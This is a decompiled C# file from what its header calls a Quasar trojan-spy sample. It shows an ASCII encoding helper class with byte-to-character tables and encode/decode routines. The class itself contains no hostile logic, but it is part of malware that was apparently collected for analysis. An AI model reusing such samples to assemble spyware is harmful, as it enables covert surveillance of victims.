// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ClientEngine.ASCIIEncoding
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System.Collections.Generic;
using System.Text;

namespace NoiseMe.Drags.App.Models.SuperSocket.ClientEngine
{
  public class ASCIIEncoding : Encoding
  {
    private static ASCIIEncoding m_Instance = (ASCIIEncoding) null;
    private char? fallbackCharacter;
    private static char[] byteToChar = new char[128]
    {
      char.MinValue,
      '\u0001',
      '\u0002',
      '\u0003',
      '\u0004',
      '\u0005',
      '\u0006',
      '\a',
      '\b',
      '\t',
      '\n',
      '\v',
      '\f',
      '\r',
      '\u000E',
      '\u000F',
      '\u0010',
      '\u0011',
      '\u0012',
      '\u0013',
      '\u0014',
      '\u0015',
      '\u0016',
      '\u0017',
      '\u0018',
      '\u0019',
      '\u001A',
      '\u001B',
      '\u001C',
      '\u001D',
      '\u001E',
      '\u001F',
      ' ',
      '!',
      '"',
      '#',
      '$',
      '%',
      '&',
      '\'',
      '(',
      ')',
      '*',
      '+',
      ',',
      '-',
      '.',
      '/',
      '0',
      '1',
      '2',
      '3',
      '4',
      '5',
      '6',
      '7',
      '8',
      '9',
      ':',
      ';',
      '<',
      '=',
      '>',
      '?',
      '@',
      'A',
      'B',
      'C',
      'D',
      'E',
      'F',
      'G',
      'H',
      'I',
      'J',
      'K',
      'L',
      'M',
      'N',
      'O',
      'P',
      'Q',
      'R',
      'S',
      'T',
      'U',
      'V',
      'W',
      'X',
      'Y',
      'Z',
      '[',
      '\\',
      ']',
      '^',
      '_',
      '`',
      'a',
      'b',
      'c',
      'd',
      'e',
      'f',
      'g',
      'h',
      'i',
      'j',
      'k',
      'l',
      'm',
      'n',
      'o',
      'p',
      'q',
      'r',
      's',
      't',
      'u',
      'v',
      'w',
      'x',
      'y',
      'z',
      '{',
      '|',
      '}',
      '~',
      '\u007F'
    };
    private static Dictionary<char, byte> charToByte = new Dictionary<char, byte>()
    {
      {
        char.MinValue,
        (byte) 0
      },
      {
        '\u0001',
        (byte) 1
      },
      {
        '\u0002',
        (byte) 2
      },
      {
        '\u0003',
        (byte) 3
      },
      {
        '\u0004',
        (byte) 4
      },
      {
        '\u0005',
        (byte) 5
      },
      {
        '\u0006',
        (byte) 6
      },
      {
        '\a',
        (byte) 7
      },
      {
        '\b',
        (byte) 8
      },
      {
        '\t',
        (byte) 9
      },
      {
        '\n',
        (byte) 10
      },
      {
        '\v',
        (byte) 11
      },
      {
        '\f',
        (byte) 12
      },
      {
        '\r',
        (byte) 13
      },
      {
        '\u000E',
        (byte) 14
      },
      {
        '\u000F',
        (byte) 15
      },
      {
        '\u0010',
        (byte) 16
      },
      {
        '\u0011',
        (byte) 17
      },
      {
        '\u0012',
        (byte) 18
      },
      {
        '\u0013',
        (byte) 19
      },
      {
        '\u0014',
        (byte) 20
      },
      {
        '\u0015',
        (byte) 21
      },
      {
        '\u0016',
        (byte) 22
      },
      {
        '\u0017',
        (byte) 23
      },
      {
        '\u0018',
        (byte) 24
      },
      {
        '\u0019',
        (byte) 25
      },
      {
        '\u001A',
        (byte) 26
      },
      {
        '\u001B',
        (byte) 27
      },
      {
        '\u001C',
        (byte) 28
      },
      {
        '\u001D',
        (byte) 29
      },
      {
        '\u001E',
        (byte) 30
      },
      {
        '\u001F',
        (byte) 31
      },
      {
        ' ',
        (byte) 32
      },
      {
        '!',
        (byte) 33
      },
      {
        '"',
        (byte) 34
      },
      {
        '#',
        (byte) 35
      },
      {
        '$',
        (byte) 36
      },
      {
        '%',
        (byte) 37
      },
      {
        '&',
        (byte) 38
      },
      {
        '\'',
        (byte) 39
      },
      {
        '(',
        (byte) 40
      },
      {
        ')',
        (byte) 41
      },
      {
        '*',
        (byte) 42
      },
      {
        '+',
        (byte) 43
      },
      {
        ',',
        (byte) 44
      },
      {
        '-',
        (byte) 45
      },
      {
        '.',
        (byte) 46
      },
      {
        '/',
        (byte) 47
      },
      {
        '0',
        (byte) 48
      },
      {
        '1',
        (byte) 49
      },
      {
        '2',
        (byte) 50
      },
      {
        '3',
        (byte) 51
      },
      {
        '4',
        (byte) 52
      },
      {
        '5',
        (byte) 53
      },
      {
        '6',
        (byte) 54
      },
      {
        '7',
        (byte) 55
      },
      {
        '8',
        (byte) 56
      },
      {
        '9',
        (byte) 57
      },
      {
        ':',
        (byte) 58
      },
      {
        ';',
        (byte) 59
      },
      {
        '<',
        (byte) 60
      },
      {
        '=',
        (byte) 61
      },
      {
        '>',
        (byte) 62
      },
      {
        '?',
        (byte) 63
      },
      {
        '@',
        (byte) 64
      },
      {
        'A',
        (byte) 65
      },
      {
        'B',
        (byte) 66
      },
      {
        'C',
        (byte) 67
      },
      {
        'D',
        (byte) 68
      },
      {
        'E',
        (byte) 69
      },
      {
        'F',
        (byte) 70
      },
      {
        'G',
        (byte) 71
      },
      {
        'H',
        (byte) 72
      },
      {
        'I',
        (byte) 73
      },
      {
        'J',
        (byte) 74
      },
      {
        'K',
        (byte) 75
      },
      {
        'L',
        (byte) 76
      },
      {
        'M',
        (byte) 77
      },
      {
        'N',
        (byte) 78
      },
      {
        'O',
        (byte) 79
      },
      {
        'P',
        (byte) 80
      },
      {
        'Q',
        (byte) 81
      },
      {
        'R',
        (byte) 82
      },
      {
        'S',
        (byte) 83
      },
      {
        'T',
        (byte) 84
      },
      {
        'U',
        (byte) 85
      },
      {
        'V',
        (byte) 86
      },
      {
        'W',
        (byte) 87
      },
      {
        'X',
        (byte) 88
      },
      {
        'Y',
        (byte) 89
      },
      {
        'Z',
        (byte) 90
      },
      {
        '[',
        (byte) 91
      },
      {
        '\\',
        (byte) 92
      },
      {
        ']',
        (byte) 93
      },
      {
        '^',
        (byte) 94
      },
      {
        '_',
        (byte) 95
      },
      {
        '`',
        (byte) 96
      },
      {
        'a',
        (byte) 97
      },
      {
        'b',
        (byte) 98
      },
      {
        'c',
        (byte) 99
      },
      {
        'd',
        (byte) 100
      },
      {
        'e',
        (byte) 101
      },
      {
        'f',
        (byte) 102
      },
      {
        'g',
        (byte) 103
      },
      {
        'h',
        (byte) 104
      },
      {
        'i',
        (byte) 105
      },
      {
        'j',
        (byte) 106
      },
      {
        'k',
        (byte) 107
      },
      {
        'l',
        (byte) 108
      },
      {
        'm',
        (byte) 109
      },
      {
        'n',
        (byte) 110
      },
      {
        'o',
        (byte) 111
      },
      {
        'p',
        (byte) 112
      },
      {
        'q',
        (byte) 113
      },
      {
        'r',
        (byte) 114
      },
      {
        's',
        (byte) 115
      },
      {
        't',
        (byte) 116
      },
      {
        'u',
        (byte) 117
      },
      {
        'v',
        (byte) 118
      },
      {
        'w',
        (byte) 119
      },
      {
        'x',
        (byte) 120
      },
      {
        'y',
        (byte) 121
      },
      {
        'z',
        (byte) 122
      },
      {
        '{',
        (byte) 123
      },
      {
        '|',
        (byte) 124
      },
      {
        '}',
        (byte) 125
      },
      {
        '~',
        (byte) 126
      },
      {
        '\u007F',
        (byte) 127
      }
    };

    static ASCIIEncoding() => ASCIIEncoding.m_Instance = new ASCIIEncoding();

    public static ASCIIEncoding Instance => ASCIIEncoding.m_Instance;

    public override string WebName => "us-ascii";

    public override int GetHashCode() => this.WebName.GetHashCode();

    public char? FallbackCharacter
    {
      get => this.fallbackCharacter;
      set
      {
        this.fallbackCharacter = value;
        if (value.HasValue && !ASCIIEncoding.charToByte.ContainsKey(value.Value))
          throw new EncoderFallbackException(string.Format("Cannot use the character [{0}] (int value {1}) as fallback value - the fallback character itself is not supported by the encoding.", (object) value.Value, (object) (int) value.Value));
        this.FallbackByte = value.HasValue ? new byte?(ASCIIEncoding.charToByte[value.Value]) : new byte?();
      }
    }

    public byte? FallbackByte { get; private set; }

    public ASCIIEncoding() => this.FallbackCharacter = new char?('?');

    public override int GetBytes(
      char[] chars,
      int charIndex,
      int charCount,
      byte[] bytes,
      int byteIndex)
    {
      return !this.FallbackByte.HasValue ? this.GetBytesWithoutFallback(chars, charIndex, charCount, bytes, byteIndex) : this.GetBytesWithFallBack(chars, charIndex, charCount, bytes, byteIndex);
    }

    private int GetBytesWithFallBack(
      char[] chars,
      int charIndex,
      int charCount,
      byte[] bytes,
      int byteIndex)
    {
      for (int index = 0; index < charCount; ++index)
      {
        char key = chars[index + charIndex];
        byte num;
        bool flag = ASCIIEncoding.charToByte.TryGetValue(key, out num);
        bytes[byteIndex + index] = flag ? num : this.FallbackByte.Value;
      }
      return charCount;
    }

    private int GetBytesWithoutFallback(
      char[] chars,
      int charIndex,
      int charCount,
      byte[] bytes,
      int byteIndex)
    {
      for (int index = 0; index < charCount; ++index)
      {
        char key = chars[index + charIndex];
        byte num;
        if (!ASCIIEncoding.charToByte.TryGetValue(key, out num))
          throw new EncoderFallbackException(string.Format("The encoding [{0}] cannot encode the character [{1}] (int value {2}). Set the FallbackCharacter property in order to suppress this exception and encode a default character instead.", (object) this.WebName, (object) key, (object) (int) key));
        bytes[byteIndex + index] = num;
      }
      return charCount;
    }

    public override int GetChars(
      byte[] bytes,
      int byteIndex,
      int byteCount,
      char[] chars,
      int charIndex)
    {
      return !this.FallbackCharacter.HasValue ? this.GetCharsWithoutFallback(bytes, byteIndex, byteCount, chars, charIndex) : this.GetCharsWithFallback(bytes, byteIndex, byteCount, chars, charIndex);
    }

    private int GetCharsWithFallback(
      byte[] bytes,
      int byteIndex,
      int byteCount,
      char[] chars,
      int charIndex)
    {
      for (int index1 = 0; index1 < byteCount; ++index1)
      {
        byte index2 = bytes[index1 + byteIndex];
        char ch = (int) index2 >= ASCIIEncoding.byteToChar.Length ? this.FallbackCharacter.Value : ASCIIEncoding.byteToChar[(int) index2];
        chars[charIndex + index1] = ch;
      }
      return byteCount;
    }

    private int GetCharsWithoutFallback(
      byte[] bytes,
      int byteIndex,
      int byteCount,
      char[] chars,
      int charIndex)
    {
      for (int index1 = 0; index1 < byteCount; ++index1)
      {
        byte index2 = bytes[index1 + byteIndex];
        if ((int) index2 >= ASCIIEncoding.byteToChar.Length)
          throw new EncoderFallbackException(string.Format("The encoding [{0}] cannot decode byte value [{1}]. Set the FallbackCharacter property in order to suppress this exception and decode the value as a default character instead.", (object) this.WebName, (object) index2));
        chars[charIndex + index1] = ASCIIEncoding.byteToChar[(int) index2];
      }
      return byteCount;
    }

    public override int GetByteCount(char[] chars, int index, int count) => count;

    public override int GetCharCount(byte[] bytes, int index, int count) => count;

    public override int GetMaxByteCount(int charCount) => charCount;

    public override int GetMaxCharCount(int byteCount) => byteCount;

    public static int CharacterCount => ASCIIEncoding.byteToChar.Length;
  }
}
